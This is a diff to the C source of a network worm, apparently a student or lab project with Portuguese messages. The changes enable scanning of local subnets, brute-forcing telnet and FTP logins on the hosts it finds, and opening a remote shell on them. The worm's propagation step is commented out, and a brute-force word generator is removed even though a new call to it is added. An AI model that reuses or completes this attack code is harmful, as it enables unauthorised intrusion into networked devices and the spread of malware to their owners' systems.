@@ -33,18 +33,14 @@ int command_bg(int fd, const char *str, ...);
 int shell(int fd);
 
 int main(int argc, char *argv[]) {
-    // ip_subnet *subnets;
-    // int subnet_count;
+    ip_subnet *subnets;
+    int subnet_count;
 
-    // subnet_count = getLocalSubnets(&subnets);
-    // scanSubnets(subnets, subnet_count, &scan_callback);
+    subnet_count = getLocalSubnets(&subnets);
+    scanSubnets(subnets, subnet_count, &scan_callback);
 
-    int fd;
-
-    fd = telnet_login(inet_addr("10.2.0.100"), 23);
-    printf("Logged in.\n");
-
-    shell(fd);
+    // FOR TESTING:
+    // scan_callback(inet_addr("10.2.0.100"), 0, 1);
 
     exit(EXIT_SUCCESS);
 }
@@ -52,7 +48,8 @@ int main(int argc, char *argv[]) {
 void scan_callback(uint32_t addr, int ftp_open, int telnet_open) {
     int fd;
 
-    printf("# %s is %d and %d\n", addrToString(addr), ftp_open, telnet_open);
+    printf("# Found %s (ftp: %d, telnet: %d), attacking...\n",
+        addrToString(addr), ftp_open, telnet_open);
 
     if (ftp_open && telnet_open) {
         if (rand() % 2)
@@ -68,17 +65,17 @@ void scan_callback(uint32_t addr, int ftp_open, int telnet_open) {
     }
 
     if (fd < 0) {
-        fprintf(stderr, "Falha ao excutar ataque.\n");
+        fprintf(stderr, "Falha ao executar ataque.\n");
         return;
     }
 
-    printf("# Propagating worm...\n");
-    if (propagate(fd) != 0) {
-        fprintf(stderr, "Falha ao propagar o worm.\n");
-        return;
-    }
+    // printf("# Propagating worm...\n");
+    // if (propagate(fd) != 0) {
+    //     fprintf(stderr, "Falha ao propagar o worm.\n");
+    //     return;
+    // }
 
-    // shell(fd);
+    shell(fd);
 
     close(fd);
 }
@@ -131,6 +128,8 @@ int run_telnet_bruteforce(uint32_t addr) {
     // //command(fd, "terminal length 0\n\n");
 
     // command(fd, "touch teste.txt\n\n");
+
+    findWord();
 
     ret = 1;
 
@@ -330,43 +329,4 @@ int shell(int fd) {
     }
 
     return 0;
-}
-
-void findWord(){
-    int size = 0;
-    int first, second, third, fourth, fifth, sixth, seventh, eighth;
-    int second_flag, third_flag, fourth_flag, fifth_flag, sixth_flag, seventh_flag, eighth_flag;
-    char first_char, second_char, third_char, fourth_char, fifth_char, sixth_char, seventh_char, eighth_char;
-    int word_index = 0;
-    char *word;
-	char buffer[33];
-    
-	for(first = 0; first <= 62; first ++){
-        first_char = return_char(first, &size);
-        
-        for(second = return_flag(first); second <= 62; second ++){
-            second_char = return_char(second, &size);
-            
-            for(third = return_flag(second); third <= 62; third ++){
-                third_char = return_char(third, &size);
-                
-                for(fourth = return_flag(third); fourth <= 62; fourth ++){
-                    fourth_char = return_char(fourth, &size);
-                    
-                    word = malloc (size + 2);
-                                    
-                    int i = 0;
-                                    
-                    append_char_function(first_char, word, &i);
-                    append_char_function(second_char, word, &i);
-                    append_char_function(third_char, word, &i);
-                    append_char_function(fourth_char, word, &i);;
-                    i++;
-                    word[i] = '\0';
-                    // runTelNetBruteForce(hostname, word);
-                               
-                }
-            }
-        }
-    }
 }
